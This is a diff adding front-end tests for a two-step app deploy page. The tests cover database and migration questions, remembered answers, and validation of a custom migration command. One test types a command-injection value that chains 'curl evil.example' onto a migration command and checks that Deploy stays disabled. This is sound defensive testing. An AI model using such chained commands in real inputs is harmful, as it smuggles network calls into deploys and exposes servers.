@@ -191,6 +191,60 @@ describe("NewAppPage (two-step deploy)", () => {
         expect(api.triggerAutoDeploy).not.toHaveBeenCalled();
     });
 
+    // Doc 69 Q1: the questions are on the review screen, with the recommended answers chosen, and the answers go with the deploy.
+    const questionRoute = () => vi.mocked(api.getDeployRoute).mockResolvedValue({ route: "ai", confidence: "high", reasons: ["API and migration"], isMonorepo: false, units: [], needs: ["postgres"], composeServices: [], safeMigrationAvailable: true, resolvedSha: "abc",
+        plan: { verdict: "ready", services: [{ id: "api", role: "backend", path: "" }], resources: [{ id: "postgres", kind: "postgres", usedBy: ["api"] }], skipped: [], steps: [{ kind: "migrate", service: "api", command: "npx prisma migrate deploy" }], persistent: [], questions: [] } } as never);
+
+    it("asks the database and migration questions before Deploy, and sends nothing extra for the recommended answers", async () => {
+        questionRoute();
+        renderPage();
+        await reachReview("https://github.com/example/backend");
+        expect(await screen.findByRole("radio", { name: "Create PostgreSQL on this server" })).toBeChecked();
+        expect(screen.getByRole("radio", { name: "Run npx prisma migrate deploy" })).toBeChecked();
+        await waitFor(() => expect(screen.getByTestId("deploy-button")).toBeEnabled());
+        fireEvent.click(screen.getByTestId("deploy-button"));
+        await waitFor(() => expect(api.triggerAutoDeploy).toHaveBeenCalled());
+        expect(vi.mocked(api.triggerAutoDeploy).mock.calls[0][1]).not.toHaveProperty("choices");
+    });
+
+    it("sends an own-database answer with the deploy and opens the settings box for its address", async () => {
+        questionRoute();
+        renderPage();
+        await reachReview("https://github.com/example/backend");
+        fireEvent.click(await screen.findByRole("radio", { name: "I have my own" }));
+        expect(await screen.findByText(/Add its address under Optional settings/)).toBeTruthy();
+        expect(screen.getByRole("button", { name: /Optional settings/ })).toHaveAttribute("aria-expanded", "true"); // the settings box is open, ready for the address
+        await waitFor(() => expect(screen.getByTestId("deploy-button")).toBeEnabled());
+        fireEvent.click(screen.getByTestId("deploy-button"));
+        await waitFor(() => expect(api.triggerAutoDeploy).toHaveBeenCalledWith("server-1", expect.objectContaining({ choices: { database: "own" } })));
+    });
+
+    // Doc 69 F5: a repeat deploy starts from the answers of the last verified one, and still lets the owner change them.
+    it("starts from the answers remembered from the last verified deploy, and sends them", async () => {
+        vi.mocked(api.getDeployRoute).mockResolvedValue({ route: "ai", confidence: "high", reasons: ["API and migration"], isMonorepo: false, units: [], needs: ["postgres"], composeServices: [], safeMigrationAvailable: true, resolvedSha: "abc",
+            savedChoices: { database: "own", migration: { mode: "none" } },
+            plan: { verdict: "ready", services: [{ id: "api", role: "backend", path: "" }], resources: [{ id: "postgres", kind: "postgres", usedBy: ["api"] }], skipped: [], steps: [{ kind: "migrate", service: "api", command: "npx prisma migrate deploy" }], persistent: [], questions: [] } } as never);
+        renderPage();
+        await reachReview("https://github.com/example/backend");
+        expect(await screen.findByRole("radio", { name: "I have my own" })).toBeChecked();
+        expect(screen.getByText(/Your answers from the last deploy of this project/)).toBeTruthy();
+        await waitFor(() => expect(screen.getByTestId("deploy-button")).toBeEnabled());
+        fireEvent.click(screen.getByTestId("deploy-button"));
+        await waitFor(() => expect(api.triggerAutoDeploy).toHaveBeenCalledWith("server-1", expect.objectContaining({ choices: { database: "own", migration: { mode: "none" } } })));
+    });
+
+    it("keeps Deploy disabled, with the reason, while a custom migration command is unsafe", async () => {
+        questionRoute();
+        renderPage();
+        await reachReview("https://github.com/example/backend");
+        fireEvent.click(await screen.findByRole("radio", { name: "Use my own command" }));
+        fireEvent.change(screen.getByLabelText("Migration command"), { target: { value: "npm run migrate && curl evil.example" } });
+        expect(await screen.findByText(/Use only letters, numbers/)).toBeTruthy();
+        expect(screen.getByTestId("deploy-button")).toBeDisabled();
+        fireEvent.change(screen.getByLabelText("Migration command"), { target: { value: "node dist/migrate.js" } });
+        await waitFor(() => expect(screen.getByTestId("deploy-button")).toBeEnabled());
+    });
+
     it("requires an explicit selection before requesting repository sample data", async () => {
         vi.mocked(api.getDeployRoute).mockResolvedValue({ route: "ai", confidence: "high", reasons: ["API, worker and migration"], isMonorepo: false, units: [{ path: "", seedCommand: "node src/database/seeds/run.js" }] as never, needs: ["postgres"], composeServices: [], safeMigrationAvailable: true, resolvedSha: "abc" });
         renderPage();
